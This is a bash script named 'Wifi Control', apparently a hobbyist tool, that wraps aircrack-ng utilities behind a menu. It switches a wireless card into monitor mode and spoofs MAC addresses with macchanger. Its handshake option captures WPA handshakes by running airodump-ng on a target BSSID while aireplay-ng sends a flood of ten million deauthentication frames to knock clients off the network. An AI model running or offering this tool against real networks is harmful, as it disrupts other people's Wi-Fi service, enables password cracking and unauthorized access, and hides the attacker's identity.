#!/bin/bash

# resize terminal window
resize -s 80 95  > /dev/null

#Colors
green='\e[0;32m'
red='\e[1;31m'
yellow='\e[1;33m'
RedF="${Escape}[31m"
LighGreenF="${Escape}[92m"
blue='\e[1;34m'
# Check root
[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo  $red "You must be root to run the script"; echo ; exit 1; }
clear 

#check if gnome-terminal is installed
which gnome-terminal > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] gnome-terminal............................. [ found ] "
which gnome-terminal > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] gnome-terminal -> ${RedF}not found! "
sleep 2
echo -e $yellow "[ ! ] Installing gnome-terminal "
sleep 2
echo -e $green ""
sudo apt-get install gnome-terminal -y
echo -e $blue "[ ✔ ] Done installing .... "
which gnome-terminal > /dev/null 2>&1
fi

#check if macchanger is installed
wwhich macchanger > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] macchanger............................. [ found ] "
which macchanger > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] macchanger -> ${RedF}not found! "
sleep 2
echo -e $yellow "[ ! ] Installing macchanger "
sleep 2
echo -e $green ""
sudo apt-get install macchanger -y
echo -e $blue "[ ✔ ] Done installing .... "
which macchanger > /dev/null 2>&1
fi

clear
echo -e $red "░██╗░░░░░░░██╗██╗███████╗██╗░░░░██╗░█████╗░░█████╗░███╗░░██╗████████╗██████╗░░█████╗░██╗░░░░░"; sleep 0.2
echo -e $red "░██║░░██╗░░██║██║██╔════╝██║░░░██╔╝██╔══██╗██╔══██╗████╗░██║╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░"; sleep 0.2
echo -e $red "░╚██╗████╗██╔╝██║█████╗░░██║░░██╔╝░██║░░╚═╝██║░░██║██╔██╗██║░░░██║░░░██████╔╝██║░░██║██║░░░░░"; sleep 0.2
echo -e $red "░░████╔═████║░██║██╔══╝░░██║░██╔╝░░██║░░██╗██║░░██║██║╚████║░░░██║░░░██╔══██╗██║░░██║██║░░░░░"; sleep 0.2
echo -e $red "░░╚██╔╝░╚██╔╝░██║██║░░░░░██║██╔╝░░░╚█████╔╝╚█████╔╝██║░╚███║░░░██║░░░██║░░██║╚█████╔╝███████╗"; sleep 0.2
echo -e $red "░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░░░░╚════╝░░╚════╝░╚═╝░░╚══╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚══════╝"; sleep 0.2

echo 
echo "╔─────────────────────────────────────────╗"; sleep 0.5
echo "|My Github  https://github.com/moemen-n7  |"; sleep 0.5
echo "┖─────────────────────────────────────────┙"; sleep 0.5
sudo cat /etc/issue.net       
echo 
          echo -e $green"          ""(<1>Monitor mode)"; sleep 0.2
echo 
          echo -e $green"          ""(<2>Managed mode)"; sleep 0.2
echo 
          echo -e $green"          ""(<3>Mac channger)"; sleep 0.2
echo 
          echo -e $green"          ""(<4>handshake)"; sleep 0.2
echo  
read -p "          ""Choose from options >> " choose
echo 
echo "<Starting up>"; sleep 2

if [ $choose -eq 1 ]
then 
clear

echo -e $red"███╗░░░███╗░█████╗░███╗░░██╗██╗████████╗░█████╗░██████╗░"; sleep 0.2
echo -e $red"████╗░████║██╔══██╗████╗░██║██║╚══██╔══╝██╔══██╗██╔══██╗"; sleep 0.2
echo -e $red"██╔████╔██║██║░░██║██╔██╗██║██║░░░██║░░░██║░░██║██████╔╝"; sleep 0.2
echo -e $red"██║╚██╔╝██║██║░░██║██║╚████║██║░░░██║░░░██║░░██║██╔══██╗"; sleep 0.2
echo -e $red"██║░╚═╝░██║╚█████╔╝██║░╚███║██║░░░██║░░░╚█████╔╝██║░░██║"; sleep 0.2
echo -e $red"╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚══╝╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝"; sleep 0.2
echo 
echo -e $green
iwconfig
echo "============================================"; sleep 0.2
read -p "enter your interface (wlan0,wlan0mon) :- " wlan 
echo "============================================"; sleep 0.2
echo 
ifconfig $wlan down
airmon-ng check kill
iwconfig $wlan mode monitor
ifconfig $wlan up
iwconfig
aireplay-ng --test $wlan
echo 
clear
echo "monitor mode is up now enjoy! :)"
 fi



 
if [ $choose -eq 2 ]
then

clear
 echo -e $red"███╗░░░███╗░█████╗░███╗░░██╗░█████╗░░██████╗░███████╗██████╗░"; sleep 0.2
 echo -e $red"████╗░████║██╔══██╗████╗░██║██╔══██╗██╔════╝░██╔════╝██╔══██╗"; sleep 0.2
 echo -e $red"██╔████╔██║███████║██╔██╗██║███████║██║░░██╗░█████╗░░██║░░██║"; sleep 0.2
 echo -e $red"██║╚██╔╝██║██╔══██║██║╚████║██╔══██║██║░░╚██╗██╔══╝░░██║░░██║"; sleep 0.2
 echo -e $red"██║░╚═╝░██║██║░░██║██║░╚███║██║░░██║╚██████╔╝███████╗██████╔╝"; sleep 0.2
 echo -e $red"╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚═════╝░"; sleep 0.2
 echo
 echo  
 echo -e $green
iwconfig
echo "============================================"; sleep 0.2
read -p "enter your interface (wlan0,wlan0mon) :- " wlan 
echo "============================================"; sleep 0.2
echo 
ifconfig $wlan down
airmon-ng check kill
iwconfig $wlan mode managed
ifconfig $wlan up
service NetworkManager restart
iwconfig
echo
clear
echo "managed mod is up enjoy! :)"
 fi


if [ $choose -eq 3 ]
then 
#!/bin/bash
clear
echo -e $red"███╗░░░███╗░█████╗░░█████╗░░█████╗░██╗░░██╗░█████╗░███╗░░██╗░██████╗░███████╗██████╗░"; sleep 0.2
echo -e $red"████╗░████║██╔══██╗██╔════╗██╔════╗██║░░██║██╔══██╗████╗░██║██╔════╝░██╔════╝██╔══██╗"; sleep 0.2
echo -e $red"██║╚██╔╝██║██╔══██║██║░░░░╗██║░░░░╗██╔══██║██╔══██║██║╚████║██║░░╚██╗██╔══╝░░██╔══██╗"; sleep 0.2
echo -e $red"██║░╚═╝░██║██║░░██║╚█████╔╝╚█████╔╝██║░░██║██║░░██║██║░╚███║╚██████╔╝███████╗██║░░██║"; sleep 0.2
echo -e $red"╚═╝░░░░░╚═╝╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░╚═════╝░╚══════╝╚═╝░░╚═╝"; sleep 0.2
echo -e $green
echo
echo "               ""<1>Print the MAC adress >> "; sleep 0.2
echo 
echo "               ""<2>Set fully random MAC >> "; sleep 0.2
echo 
echo "               ""<3>Reset to original >> "; sleep 0.2
echo 
echo "               ""<4>mac changer manual >> "; sleep 0.2
echo 
read -p "Choose from options >> " choose 
echo 


if [ $choose -eq 1 ]
then
clear
iwconfig
echo "================================================"; sleep 0.2
read -p "enter your interface (wlan0,wlan0mon) :- " wlan
echo "================================================"; sleep 0.2
macchanger --show $wlan
fi




  
if [ $choose -eq 2 ]
then
clear
iwconfig
echo "================================================"; sleep 0.2
read -p "enter your interface (wlan0,wlan0mon) :- " wlan
echo "================================================"; sleep 0.2
ifconfig $wlan down
macchanger --random $wlan
ifconfig $wlan up
macchanger --show $wlan
  fi
  
  
  
  
if [ $choose -eq 3 ]
then
clear
iwconfig
echo "================================================"; sleep 0.2
read -p "enter your interface (wlan0,wlan0mon) :- " wlan 
echo "================================================"; sleep 0.2
ifconfig $wlan down
sudo macchanger  --permanent $wlan
ifconfig $wlan up
fi



 
if [ $choose -eq 4 ]
then 
clear
iwconfig
echo "=================================================="; sleep 0.5
read -p "enter your interface (wlan0,wlan0mon) :- " wlan
echo "=================================================="; sleep 0.5
sleep 0.5
ifconfig $wlan down
echo "========================"; sleep 0.5
read -p "enter the mac :- " mac
echo "========================"; sleep 0.5
ifconfig $wlan hw ether $mac
ifconfig $wlan up
macchanger --show $wlan
fi

fi



if [ $choose -eq 4 ]
then 
clear
#!/bin/bash
        echo -e $red"██╗░░██╗░█████╗░███╗░░██╗██████╗░░██████╗██╗░░██╗░█████╗░██╗░░██╗███████╗"; sleep 0.2
        echo -e $red"██║░░██║██╔══██╗████╗░██║██╔══██╗██╔════╝██║░░██║██╔══██╗██║░██╔╝██╔════╝"; sleep 0.2
        echo -e $red"███████║███████║██╔██╗██║██║░░██║╚█████╗░███████║███████║█████═╝░█████╗░░"; sleep 0.2
        echo -e $red"██╔══██║██╔══██║██║╚████║██║░░██║░╚═══██╗██╔══██║██╔══██║██╔═██╗░██╔══╝░░"; sleep 0.2
        echo -e $red"██║░░██║██║░░██║██║░╚███║██████╔╝██████╔╝██║░░██║██║░░██║██║░╚██╗███████╗"; sleep 0.2
        echo -e $red"╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝"; sleep 0.2
        echo 
        echo 
echo 
echo -e $green
iwconfig 
echo 
echo "================================================="; sleep 0.2
read -p "enter your interface (wlan0,wlan0mon) :- " wlan 
echo "================================================="; sleep 0.2
sleep 0.5
echo
ifconfig $wlan down
airmon-ng check kill
iwconfig $wlan mode monitor
ifconfig $wlan up
clear
iwconfig
sleep 1s
echo
clear
airodump-ng $wlan
echo "======================================"; sleep 0.2
 # detect ctrl+c exiting
trap ctrl_c INT
ctrl_c() {
clear
sleep 1
echo ""
ifconfig $wlan down
airmon-ng check kill
iwconfig $wlan mode managed
ifconfig $wlan up
service NetworkManager restart
clear
echo -e $yellow" Thanks For Using Wifi Control :)"
exit
}
read -p "but the bssid (mac adress):- " mac 
echo "======================================"; sleep 0.2
sleep 0.5
echo 
echo "=========================="; sleep 0.2
read -p "but the channel:- " ch 
echo "=========================="; sleep 0.2
sleep 0.5
echo
echo "========================================"; sleep 0.2
read -p "but the name of the handshake:- " name 
echo "========================================"; sleep 0.2
sleep 0.5
gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+320 -x airodump-ng $wlan --bssid $mac -c $ch -w $name 
 gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+320 -x aireplay-ng --deauth 10000000 -a $mac $wlan 
fi





echo 
echo -e $green"    ""╔──────────────────────────────────────────────╗"; sleep 0.5
echo -e $green"    ""|              <Made by Moemen_N7>             |"; sleep 0.5
echo -e $green"    ""|https://github.com/moemenkali/Wifi-Control.git|"; sleep 0.5
echo -e $green"    ""┖──────────────────────────────────────────────┙"; sleep 0.5
echo -e $yellow"               ""Thanks For Using Wifi Control  :)"; sleep 0.5
